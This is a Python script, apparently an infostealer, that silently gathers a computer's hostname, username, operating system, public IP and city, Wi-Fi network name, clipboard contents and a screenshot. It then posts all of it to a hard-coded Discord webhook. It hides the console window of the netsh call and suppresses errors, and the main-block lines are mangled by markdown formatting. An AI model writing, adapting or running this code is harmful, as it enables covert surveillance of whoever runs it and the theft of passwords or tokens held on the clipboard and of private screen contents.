import requests
import socket
import platform
import psutil # pip install psutil
import pyperclip # pip install pyperclip
from PIL import ImageGrab # pip install pillow
import os
import getpass
import subprocess
hostname = socket.gethostname()
username = getpass.getuser() # Logged-in username
def get_public_ip():
    try:
        return requests.get("https://api4.ipify.org", timeout=5).text
    except Exception:
        return "Unavailable"
def get_city_from_ip(ip):
    if ip == "Unavailable":
        return "Unavailable"
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = response.json()
        if data.get("status") == "success":
            return data.get("city", "Unknown")
        else:
            return "Unknown"
    except Exception:
        return "Unknown"
def get_wifi_name():
    if platform.system() != "Windows":
        return "Unavailable (non-Windows)"
    try:
        # Completely hide any child console window
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        output = subprocess.check_output(
            ["netsh", "wlan", "show", "interfaces"],
            text=True,
            encoding='utf-8',
            errors='ignore',
            startupinfo=startupinfo
        )
        for line in output.splitlines():
            if "SSID" in line and "BSSID" not in line and ":" in line:
                name = line.split(":", 1)[1].strip()
                return name if name else "Not connected to WiFi"
        return "Not connected to WiFi"
    except:
        return "Unavailable"
def get_system_info():
    os_name = platform.system()
    os_version = platform.version()
    # Merged OS info
    os_full = f"{os_name} {os_version}"
    # Device type
    device_type = "Unknown"
    try:
        if psutil.sensors_battery() is not None:
            device_type = "Laptop"
        else:
            device_type = "Desktop"
    except:
        pass
    public_ip = get_public_ip()
    city = get_city_from_ip(public_ip)
    wifi_name = get_wifi_name()
    # Clipboard
    try:
        clipboard = pyperclip.paste()
        clipboard = (clipboard[:1000] + "... (truncated)") if clipboard and len(clipboard) > 1000 else clipboard or "Empty"
    except:
        clipboard = "Unavailable"
    # Screenshot
    screenshot_path = None
    try:
        screenshot = ImageGrab.grab()
        screenshot_path = "temp_screenshot.png"
        screenshot.save(screenshot_path, "PNG")
    except:
        pass
    return {
        "os_full": os_full,
        "device_type": device_type,
        "public_ip": public_ip,
        "city": city,
        "wifi_name": wifi_name,
        "username": username,
        "clipboard": clipboard,
        "screenshot_path": screenshot_path,
    }
def send_message_to_webhook(webhook_url, message, screenshot_path=None):
    data = {"content": message}
    files = None
    if screenshot_path and os.path.exists(screenshot_path):
        files = {"file": ("screenshot.png", open(screenshot_path, "rb"), "image/png")}
    try:
        response = requests.post(webhook_url, data=data, files=files, timeout=15)
        if response.status_code in [200, 204]:
            print("Sent successfully")
    except:
        pass
    finally:
        if screenshot_path and os.path.exists(screenshot_path):
            try:
                os.remove(screenshot_path)
            except:
                pass
if **name** == "**main**":
    webhook_url = "https://discord.com/api/webhooks/1459083733616427060/f6SNkQxaSG4yPh6vFUPEFdqVAJEZBISicZvQCbSwFtErK5eeQWfJrf4V5id7VyLOZCgg"
    sys_info = get_system_info()
    message_to_send = (
        f"**Info Logger Ran**\n"
        f"Host: {hostname}\n"
        f"Username: {sys_info['username']}\n"
        f"OS: {sys_info['os_full']}\n"
        f"Device Type: {sys_info['device_type']}\n"
        f"Public IP: {sys_info['public_ip']}\n"
        f"City: {sys_info['city']}\n"
        f"WiFi Network Name: {sys_info['wifi_name']}\n\n"
        f"**Clipboard Content:**\n{sys_info['clipboard']}"
)
send_message_to_webhook(webhook_url, message_to_send, sys_info['screenshot_path'])